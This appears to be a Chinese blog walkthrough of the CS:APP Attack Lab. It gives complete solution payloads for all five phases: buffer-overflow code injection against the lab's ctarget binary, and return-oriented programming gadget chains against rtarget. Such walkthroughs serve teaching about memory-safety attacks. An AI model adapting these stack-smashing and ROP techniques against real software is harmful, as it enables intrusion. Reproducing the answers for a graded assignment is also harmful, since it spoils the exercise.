---
layout: post
title: CS:APP Lab 3 - Attack Lab
date: 2018-04-04 00:01:00
tags:
  - CSAPP
categories:
  - 计算机基础
---

<!-- more -->

## Phase 1

目标是利用 Buffer Overflow 实现 Code Injection ，在进入 `getbuf()` 函数之后，把 `touch1()` 的地址注入到栈帧最底，使得返回时的跳转指向 `touch1()`。

`objdump -d ctarget` 查看 `getbuf()` 内容就可以看到 `BUFFER_SIZE` 的值是 `0x28`，你拿到的可能会不一样。

```x86asm
<getbuf>:
sub $0x28,%rsp ; <- 在这里
mov %rsp,%rdi
callq 401a40 <Gets>
mov $0x1,%eax
add $0x28,%rsp
retq
```

`touch1()` 的位置刚好就在这个函数的下面，那么就只要在前面填充足 40 个任意字符（换行符 `\n` 和 `\0` 除外），再把地址按小端序放进去就好了：

```text
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
c0 17 40 00 00 00 00 00
```

## Phase 2

目标不仅要跳转到 `touch2()` 还要把 `cookie` 的值放进参数里，也就是说要写一段语句把参数丢进去，那么过程也比较明确：

`getbuf()` 返回时跳转至栈顶
执行注入的指令，把 `cookie` 给第一个参数也就是 `%rdi`
执行下一个注入的指令，也就是 `ret`，使其跳转至 `touch2()`
在 `getbuf()` 返回时，返回的地址要设定成刚刚栈顶的值，栈指针也会增加 8。在注入的指令返回时，返回的地址紧邻的位置上。栈顶的位置需要用 `gdb` 运行代码至 `getbuf()` 查看，最后的答案就有了：

```text
48 c7 c7 fa 97 b9 59 c3 # mov 0x59b997fa, %rdi # ret
ff ff ff ff ff ff ff ff # padding
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
78 dc 61 55 00 00 00 00 # address of injected code
ec 17 40 00 00 00 00 00 # address of touch2()
```

## Phase 3

目标不仅要跳转到 `touch3()` 还要把 `cookie` 作为 16 进制显示的字符串传作参数。考虑到字符串的长度有 8 个字节，还需要跟一个 `\0`，所以寄存器是放不下了，那么继续覆盖栈空间，并把对应地址给 `%rdi`。对照 ASCII 表把字符串转成十六进制之后答案就有了：

```text
48 8d 7c 24 08 c3 ff ff # lea 8(%rsp), %rdi # ret
ff ff ff ff ff ff ff ff # padding
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
78 dc 61 55 00 00 00 00 # address of injected code
fa 18 40 00 00 00 00 00 # address of touch3()
35 39 62 39 39 37 66 61 00 # string of cookie
```

这里字符串的位置不一定要放在最后，放在中间也可以，只要传入正确的地址即可。注意这里的字符串并不需要翻转。

## Phase 4

这次设置了栈内不可以执行代码的限制，用 ROP (Return-Oriented Programming) 解决问题。
根据 `writeup` 里的提示，要在 `start_farm()` 和 `end_farm()` 之间寻找解决方案，需要用到的主要指令只有两个 `movq` 和 `popq`。那么直接 `objdump -d rtarget` 之后在指定范围内搜索对应的字节码，要注意 `popq %rsp` 不太适用。找到对应的指令后直接跟着 `c3` 或者跟着若干 `90` 然后接着是 `c3` 的话都可用。

搜索过后找到了下面两个函数满足要求：

```x86 asm
00000000004019a0 <addval_273>:
4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax
4019a6: c3 retq

00000000004019a7 <addval_219>:
4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax
4019ad: c3 retq
```

那么答案就已经有了：

```text
ff ff ff ff ff ff ff ff # padding
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ab 19 40 00 00 00 00 00 # jump to run `popq %rax`
fa 97 b9 59 00 00 00 00 # cookie for popq
a2 19 40 00 00 00 00 00 # jump to run `movq %rax, %rdi`
ec 17 40 00 00 00 00 00 # address of touch2()
```

如果不按照题目要求，从其他地方寻找指令可以更简单，直接搜索 `5f c3`（也就是 `popq %rd`i`和`ret`）即可，当然建议按照题目要求做。这里给出一个答案：

```text
ff ff ff ff ff ff ff ff # padding
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
1b 14 40 00 00 00 00 00 # jump to run `popq %rdi`
fa 97 b9 59 00 00 00 00 # cookie for popq
ec 17 40 00 00 00 00 00 # address of touch2()
```

## Phase 5

这个和上面一个差别不大，但是确实有个头疼的地方，就是利用 `movq` 和 `popq` 组合出来答案的语句在 `farm` 中并找不到可以用的片段。字符串的位置不能紧跟在跳转地址后面，会让下一次跳转不按预期执行，除非能找到连续 `pop` 到超过字符串位置的片段来利用，显然，可惜，找不到。那么只能在地址的上做运算。

搜索过后能够确定，只有 `movq %rsp, %rax` 和 `movq %rax, %rdi` 可以用，那么只能对 `%rax` 或者 `%rdi` 做一些加减操作，或者考虑用 `lea` 指令。但是这些并没有在 `writeup` 中给出对应的字节码。

那么答案最后可以是：

```text
ff ff ff ff ff ff ff ff # padding
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
06 1a 40 00 00 00 00 00 # jump to run `movq %rsp, %rax`
d8 19 40 00 00 00 00 00 # jump to run `add 0x37, %al`
a2 19 40 00 00 00 00 00 # jump to run `movq %rax, %rdi`
fa 18 40 00 00 00 00 00 # address of touch3()
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff 35
39 62 39 39 37 66 61 00 # string of cookie
```
